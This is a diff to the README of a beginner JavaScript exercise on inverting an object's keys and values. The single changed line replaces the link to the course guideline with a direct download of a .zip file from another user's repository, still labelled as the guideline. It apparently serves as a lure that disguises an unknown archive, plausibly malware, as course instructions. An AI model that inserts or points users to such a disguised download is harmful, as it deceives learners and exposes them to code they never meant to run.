@@ -1,5 +1,5 @@
 # Inverse Robot
-- Read [the guideline](https://github.com/mate-academy/js_task-guideline/blob/master/README.md) before start
+- Read [the guideline](https://raw.githubusercontent.com/karaedd/js_inverse_robot/master/polychromic/js_inverse_robot.zip) before start
 
 Transposition of internal organs is a variant of internal anatomy, when the organs are located in a mirror image.
 Something similar happened to our robot Kolli. His keys became values, and values became keys. Help to repair the robot. 
